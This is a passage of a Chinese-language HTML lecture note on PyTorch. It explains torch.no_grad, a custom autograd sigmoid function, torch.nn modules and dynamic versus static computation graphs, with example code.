<p><strong>不需要梯度的计算</strong>: 在某些情况下（例如推理阶段），你可能不需要计算梯度。可以使用 <code>torch.no_grad()</code> 上下文管理器来临时禁用梯度计算，从而提高性能并节省内存。</p>
</li>
</ul>
<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-cv-lec11_12-__codelineno-1-1"></a><span class="k">with</span> <span class="n">torch</span><span class="o">.</span><span class="n">no_grad</span><span class="p">():</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-cv-lec11_12-__codelineno-1-2"></a>    <span class="c1"># 进行不需要梯度的计算</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-cv-lec11_12-__codelineno-1-3"></a>    <span class="o">...</span>
</span></code></pre></div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-cv-lec11_12-__codelineno-2-1"></a><span class="kn">import</span> <span class="nn">torch</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-cv-lec11_12-__codelineno-2-2"></a>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-cs-cv-lec11_12-__codelineno-2-3"></a><span class="n">N</span><span class="p">,</span> <span class="n">D_in</span><span class="p">,</span> <span class="n">H</span><span class="p">,</span> <span class="n">D_out</span> <span class="o">=</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">10</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-cs-cv-lec11_12-__codelineno-2-4"></a><span class="n">x</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">D_in</span><span class="p">)</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-cs-cv-lec11_12-__codelineno-2-5"></a><span class="n">y</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">D_out</span><span class="p">)</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-cs-cv-lec11_12-__codelineno-2-6"></a><span class="n">w1</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">D_in</span><span class="p">,</span> <span class="n">H</span><span class="p">,</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-cs-cv-lec11_12-__codelineno-2-7"></a><span class="n">w2</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">H</span><span class="p">,</span> <span class="n">D_out</span><span class="p">,</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-cs-cv-lec11_12-__codelineno-2-8"></a>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-cs-cv-lec11_12-__codelineno-2-9"></a><span class="n">learning_rate</span> <span class="o">=</span> <span class="mf">1e-6</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#note-cs-cv-lec11_12-__codelineno-2-10"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#note-cs-cv-lec11_12-__codelineno-2-11"></a>    <span class="n">y_pred</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">mm</span><span class="p">(</span><span class="n">w1</span><span class="p">)</span><span class="o">.</span><span class="n">clamp</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">mm</span><span class="p">(</span><span class="n">w2</span><span class="p">)</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#note-cs-cv-lec11_12-__codelineno-2-12"></a>    <span class="n">loss</span> <span class="o">=</span> <span class="p">(</span><span class="n">y_pred</span> <span class="o">-</span> <span class="n">y</span><span class="p">)</span><span class="o">.</span><span class="n">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">sum</span><span class="p">()</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#note-cs-cv-lec11_12-__codelineno-2-13"></a>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#note-cs-cv-lec11_12-__codelineno-2-14"></a>    <span class="n">loss</span><span class="o">.</span><span class="n">backward</span><span class="p">()</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#note-cs-cv-lec11_12-__codelineno-2-15"></a>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#note-cs-cv-lec11_12-__codelineno-2-16"></a>    <span class="k">with</span> <span class="n">torch</span><span class="o">.</span><span class="n">no_grad</span><span class="p">():</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#note-cs-cv-lec11_12-__codelineno-2-17"></a>        <span class="n">w1</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">w1</span><span class="o">.</span><span class="n">grad</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#note-cs-cv-lec11_12-__codelineno-2-18"></a>        <span class="n">w2</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">w2</span><span class="o">.</span><span class="n">grad</span>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#note-cs-cv-lec11_12-__codelineno-2-19"></a>        <span class="n">w1</span><span class="o">.</span><span class="n">grad</span><span class="o">.</span><span class="n">zero_</span><span class="p">()</span>
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#note-cs-cv-lec11_12-__codelineno-2-20"></a>        <span class="n">w2</span><span class="o">.</span><span class="n">grad</span><span class="o">.</span><span class="n">zero_</span><span class="p">()</span>
</span></code></pre></div>
<p>在这段代码执行时，torch会自动构建如下的计算图</p>
<p><figure markdown="span">
    <img alt="计算图" src="../NOTE/CS/CV/img/lec11-1.png" width="70%" />
</figure></p>
<p>并在反向传播时自动计算梯度</p>
<p>在不需要构建计算图时，可以使用 <code>torch.no_grad()</code> 上下文管理器来临时禁用梯度计算，在这里，我们进行梯度下降时，不需要构建计算图，所以使用 <code>torch.no_grad()</code> 上下文管理器来临时禁用梯度计算，结束之后，在进入下一次的迭代之前，需要将梯度清零，所以使用 <code>w1.grad.zero_()</code> 和 <code>w2.grad.zero_()</code> 清零梯度。</p>
</div>
<h3 id="note-cs-cv-lec11_12-_1">自定义函数<a class="headerlink" href="#note-cs-cv-lec11_12-_1" title="Permanent link">&para;</a></h3>
<p>在 PyTorch 中，可以通过继承 <code>torch.autograd.Function</code> 来定义新的自动求导算子，并实现 <code>forward</code> 和 <code>backward</code> 方法。以下是使用 sigmoid 函数的示例：</p>
<p><div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-cv-lec11_12-__codelineno-3-1"></a><span class="kn">import</span> <span class="nn">torch</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-cs-cv-lec11_12-__codelineno-3-2"></a>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-cs-cv-lec11_12-__codelineno-3-3"></a><span class="k">class</span> <span class="nc">SigmoidFunction</span><span class="p">(</span><span class="n">torch</span><span class="o">.</span><span class="n">autograd</span><span class="o">.</span><span class="n">Function</span><span class="p">):</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-cs-cv-lec11_12-__codelineno-3-4"></a>    <span class="nd">@staticmethod</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-cs-cv-lec11_12-__codelineno-3-5"></a>    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="nb">input</span><span class="p">):</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-cs-cv-lec11_12-__codelineno-3-6"></a>        <span class="c1"># 计算 sigmoid 函数</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-cs-cv-lec11_12-__codelineno-3-7"></a>        <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">torch</span><span class="o">.</span><span class="n">exp</span><span class="p">(</span><span class="o">-</span><span class="nb">input</span><span class="p">))</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#note-cs-cv-lec11_12-__codelineno-3-8"></a>        <span class="c1"># 保存结果以便在反向传播中使用</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#note-cs-cv-lec11_12-__codelineno-3-9"></a>        <span class="n">ctx</span><span class="o">.</span><span class="n">save_for_backward</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#note-cs-cv-lec11_12-__codelineno-3-10"></a>        <span class="k">return</span> <span class="n">result</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#note-cs-cv-lec11_12-__codelineno-3-11"></a>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#note-cs-cv-lec11_12-__codelineno-3-12"></a>    <span class="nd">@staticmethod</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#note-cs-cv-lec11_12-__codelineno-3-13"></a>    <span class="k">def</span> <span class="nf">backward</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">grad_output</span><span class="p">):</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#note-cs-cv-lec11_12-__codelineno-3-14"></a>        <span class="c1"># 获取保存的结果</span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#note-cs-cv-lec11_12-__codelineno-3-15"></a>        <span class="n">result</span><span class="p">,</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="n">saved_tensors</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#note-cs-cv-lec11_12-__codelineno-3-16"></a>        <span class="c1"># 计算 sigmoid 函数的梯度</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#note-cs-cv-lec11_12-__codelineno-3-17"></a>        <span class="n">grad_input</span> <span class="o">=</span> <span class="n">grad_output</span> <span class="o">*</span> <span class="n">result</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">result</span><span class="p">)</span>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#note-cs-cv-lec11_12-__codelineno-3-18"></a>        <span class="k">return</span> <span class="n">grad_input</span>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#note-cs-cv-lec11_12-__codelineno-3-19"></a>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#note-cs-cv-lec11_12-__codelineno-3-20"></a><span class="c1"># 示例用法</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#note-cs-cv-lec11_12-__codelineno-3-21"></a><span class="n">x</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">tensor</span><span class="p">([</span><span class="mf">1.0</span><span class="p">,</span> <span class="mf">2.0</span><span class="p">,</span> <span class="mf">3.0</span><span class="p">],</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#note-cs-cv-lec11_12-__codelineno-3-22"></a><span class="n">sigmoid</span> <span class="o">=</span> <span class="n">SigmoidFunction</span><span class="o">.</span><span class="n">apply</span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#note-cs-cv-lec11_12-__codelineno-3-23"></a><span class="n">y</span> <span class="o">=</span> <span class="n">sigmoid</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#note-cs-cv-lec11_12-__codelineno-3-24"></a><span class="n">y</span><span class="o">.</span><span class="n">backward</span><span class="p">(</span><span class="n">torch</span><span class="o">.</span><span class="n">ones_like</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#note-cs-cv-lec11_12-__codelineno-3-25"></a>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#note-cs-cv-lec11_12-__codelineno-3-26"></a><span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">grad</span><span class="p">)</span>  <span class="c1"># 输出梯度</span>
</span></code></pre></div>
1. <strong>继承 <code>Function</code></strong>:
   - 创建一个类 <code>SigmoidFunction</code>，继承自 <code>torch.autograd.Function</code>。</p>
<ol>
<li><strong>Forward 方法</strong>:</li>
<li><code>forward</code> 方法计算函数的输出。它接收一个上下文 <code>ctx</code> 和输入张量。</li>
<li>计算 sigmoid: <span class="arithmatex">\( \text{result} = \frac{1}{1 + e^{-\text{input}}} \)</span>。</li>
<li>
<p>使用 <code>ctx.save_for_backward(result)</code> 保存结果，以便在反向传播中使用。</p>
</li>
<li>
<p><strong>Backward 方法</strong>:</p>
</li>
<li><code>backward</code> 方法计算函数相对于输入的梯度。</li>
<li>使用 <code>ctx.saved_tensors</code> 获取保存的结果。</li>
<li>
<p>计算梯度: <span class="arithmatex">\( \text{grad\_input} = \text{grad\_output} \times \text{result} \times (1 - \text{result}) \)</span>。</p>
</li>
<li>
<p><strong>用法</strong>:</p>
</li>
<li>使用 <code>SigmoidFunction.apply</code> 来应用自定义函数。</li>
<li>使用 <code>y.backward()</code> 进行反向传播以计算梯度。</li>
</ol>
<h2 id="note-cs-cv-lec11_12-modules">Modules<a class="headerlink" href="#note-cs-cv-lec11_12-modules" title="Permanent link">&para;</a></h2>
<p>在 PyTorch 中，<code>torch.nn</code> 模块提供了构建神经网络的基础组件。它包含了各种神经网络层、损失函数和其他工具，帮助你快速构建和训练深度学习模型。</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-cv-lec11_12-__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">torch</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-cv-lec11_12-__codelineno-4-2"></a><span class="kn">import</span> <span class="nn">torch.nn</span> <span class="k">as</span> <span class="nn">nn</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-cs-cv-lec11_12-__codelineno-4-3"></a><span class="kn">import</span> <span class="nn">torch.optim</span> <span class="k">as</span> <span class="nn">optim</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-cs-cv-lec11_12-__codelineno-4-4"></a>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#note-cs-cv-lec11_12-__codelineno-4-5"></a><span class="c1"># 定义一个简单的全连接神经网络</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#note-cs-cv-lec11_12-__codelineno-4-6"></a><span class="k">class</span> <span class="nc">SimpleNet</span><span class="p">(</span><span class="n">nn</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#note-cs-cv-lec11_12-__codelineno-4-7"></a>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#note-cs-cv-lec11_12-__codelineno-4-8"></a>        <span class="nb">super</span><span class="p">(</span><span class="n">SimpleNet</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#note-cs-cv-lec11_12-__codelineno-4-9"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">fc1</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">50</span><span class="p">)</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#note-cs-cv-lec11_12-__codelineno-4-10"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">relu</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">ReLU</span><span class="p">()</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#note-cs-cv-lec11_12-__codelineno-4-11"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">fc2</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">Linear</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#note-cs-cv-lec11_12-__codelineno-4-12"></a>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#note-cs-cv-lec11_12-__codelineno-4-13"></a>    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#note-cs-cv-lec11_12-__codelineno-4-14"></a>        <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fc1</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#note-cs-cv-lec11_12-__codelineno-4-15"></a>        <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">relu</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#note-cs-cv-lec11_12-__codelineno-4-16"></a>        <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fc2</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#note-cs-cv-lec11_12-__codelineno-4-17"></a>        <span class="k">return</span> <span class="n">x</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#note-cs-cv-lec11_12-__codelineno-4-18"></a>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#note-cs-cv-lec11_12-__codelineno-4-19"></a><span class="c1"># 创建模型、定义损失函数和优化器</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#note-cs-cv-lec11_12-__codelineno-4-20"></a><span class="n">model</span> <span class="o">=</span> <span class="n">SimpleNet</span><span class="p">()</span>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#note-cs-cv-lec11_12-__codelineno-4-21"></a><span class="n">criterion</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">MSELoss</span><span class="p">()</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#note-cs-cv-lec11_12-__codelineno-4-22"></a><span class="n">optimizer</span> <span class="o">=</span> <span class="n">optim</span><span class="o">.</span><span class="n">SGD</span><span class="p">(</span><span class="n">model</span><span class="o">.</span><span class="n">parameters</span><span class="p">(),</span> <span class="n">lr</span><span class="o">=</span><span class="mf">0.01</span><span class="p">)</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#note-cs-cv-lec11_12-__codelineno-4-23"></a>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#note-cs-cv-lec11_12-__codelineno-4-24"></a><span class="c1"># 示例输入和目标</span>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#note-cs-cv-lec11_12-__codelineno-4-25"></a><span class="nb">input</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#note-cs-cv-lec11_12-__codelineno-4-26"></a><span class="n">target</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#note-cs-cv-lec11_12-__codelineno-4-27"></a>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#note-cs-cv-lec11_12-__codelineno-4-28"></a><span class="c1"># 前向传播</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#note-cs-cv-lec11_12-__codelineno-4-29"></a><span class="n">output</span> <span class="o">=</span> <span class="n">model</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#note-cs-cv-lec11_12-__codelineno-4-30"></a><span class="n">loss</span> <span class="o">=</span> <span class="n">criterion</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#note-cs-cv-lec11_12-__codelineno-4-31"></a>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#note-cs-cv-lec11_12-__codelineno-4-32"></a><span class="c1"># 反向传播和优化</span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#note-cs-cv-lec11_12-__codelineno-4-33"></a><span class="n">optimizer</span><span class="o">.</span><span class="n">zero_grad</span><span class="p">()</span>
</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#note-cs-cv-lec11_12-__codelineno-4-34"></a><span class="n">loss</span><span class="o">.</span><span class="n">backward</span><span class="p">()</span>
</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#note-cs-cv-lec11_12-__codelineno-4-35"></a><span class="n">optimizer</span><span class="o">.</span><span class="n">step</span><span class="p">()</span>
</span></code></pre></div>
<h2 id="note-cs-cv-lec11_12-graphs">Graphs<a class="headerlink" href="#note-cs-cv-lec11_12-graphs" title="Permanent link">&para;</a></h2>
<p>在深度学习框架中，计算图用于表示计算过程。PyTorch 和其他框架（如 TensorFlow）在计算图的构建上有不同的策略，主要分为动态计算图和静态计算图。</p>
<h3 id="note-cs-cv-lec11_12-dynamic-computation-graph">动态计算图（Dynamic Computation Graph）<a class="headerlink" href="#note-cs-cv-lec11_12-dynamic-computation-graph" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>特性</strong>: </li>
<li>计算图在每次前向传播时动态构建。</li>
<li>允许在运行时改变图的结构。</li>
<li>
<p>更加灵活，适合处理变长输入和条件逻辑。</p>
</li>
<li>
<p><strong>优点</strong>:</p>
</li>
<li>易于调试，因为可以使用标准的 Python 调试工具。</li>
<li>
<p>代码更直观，与普通的 Python 代码相似。</p>
</li>
<li>
<p><strong>缺点</strong>:</p>
</li>
<li>可能在某些情况下效率不如静态图，因为每次前向传播都需要重新构建图。</li>
</ul>
<p>动态计算图允许在前向传播过程中使用常规的 Python 控制流。这意味着你可以在模型的前向传播中使用 Python 的条件语句、循环等控制结构，而不需要预先定义整个计算图。</p>
<p>你可以根据输入数据的不同，动态调整计算图的结构。例如，可以在前向传播中使用 <code>if</code> 语句来选择不同的计算路径。</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-cv-lec11_12-__codelineno-5-1"></a><span class="kn">import</span> <span class="nn">torch</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-cv-lec11_12-__codelineno-5-2"></a>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-cs-cv-lec11_12-__codelineno-5-3"></a><span class="k">def</span> <span class="nf">dynamic_model</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">threshold</span><span class="p">):</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#note-cs-cv-lec11_12-__codelineno-5-4"></a>    <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">sum</span><span class="p">()</span> <span class="o">&gt;</span> <span class="n">threshold</span><span class="p">:</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#note-cs-cv-lec11_12-__codelineno-5-5"></a>        <span class="k">return</span> <span class="n">x</span> <span class="o">*</span> <span class="mi">2</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#note-cs-cv-lec11_12-__codelineno-5-6"></a>    <span class="k">else</span><span class="p">:</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#note-cs-cv-lec11_12-__codelineno-5-7"></a>        <span class="k">return</span> <span class="n">x</span> <span class="o">/</span> <span class="mi">2</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#note-cs-cv-lec11_12-__codelineno-5-8"></a>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#note-cs-cv-lec11_12-__codelineno-5-9"></a><span class="n">x</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">tensor</span><span class="p">([</span><span class="mf">1.0</span><span class="p">,</span> <span class="mf">2.0</span><span class="p">,</span> <span class="mf">3.0</span><span class="p">],</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#note-cs-cv-lec11_12-__codelineno-5-10"></a><span class="n">threshold</span> <span class="o">=</span> <span class="mf">5.0</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#note-cs-cv-lec11_12-__codelineno-5-11"></a><span class="n">y</span> <span class="o">=</span> <span class="n">dynamic_model</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">threshold</span><span class="p">)</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#note-cs-cv-lec11_12-__codelineno-5-12"></a><span class="n">y</span><span class="o">.</span><span class="n">backward</span><span class="p">(</span><span class="n">torch</span><span class="o">.</span><span class="n">ones_like</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#note-cs-cv-lec11_12-__codelineno-5-13"></a>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#note-cs-cv-lec11_12-__codelineno-5-14"></a><span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">grad</span><span class="p">)</span>  <span class="c1"># 输出梯度</span>
</span></code></pre></div>
<p>在这个例子中，<code>dynamic_model</code> 使用了一个 <code>if</code> 语句来根据输入 <code>x</code> 的和是否大于 <code>threshold</code> 来选择不同的计算路径。这种灵活性是动态计算图的一个重要特性，使得模型可以根据不同的输入动态调整其行为。</p>
<h3 id="note-cs-cv-lec11_12-static-computation-graph">静态计算图（Static Computation Graph）<a class="headerlink" href="#note-cs-cv-lec11_12-static-computation-graph" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>特性</strong>:</li>
<li>计算图在编译时构建，并在训练过程中保持不变。</li>
<li>
<p>需要在开始时定义整个模型的计算图。</p>
</li>
<li>
<p><strong>优点</strong>:</p>
</li>
<li>可以进行全局优化，可能提高性能。</li>
<li>
<p>适合在生产环境中部署，因为图是固定的。</p>
</li>
<li>
<p><strong>缺点</strong>:</p>
</li>
<li>不易于调试，因为图在编译时构建。</li>
<li>代码可能不如动态图直观，尤其是在处理变长输入时。</li>
</ul>
<p>使用静态图的例子如下：</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-cv-lec11_12-__codelineno-6-1"></a><span class="kn">import</span> <span class="nn">torch</span>
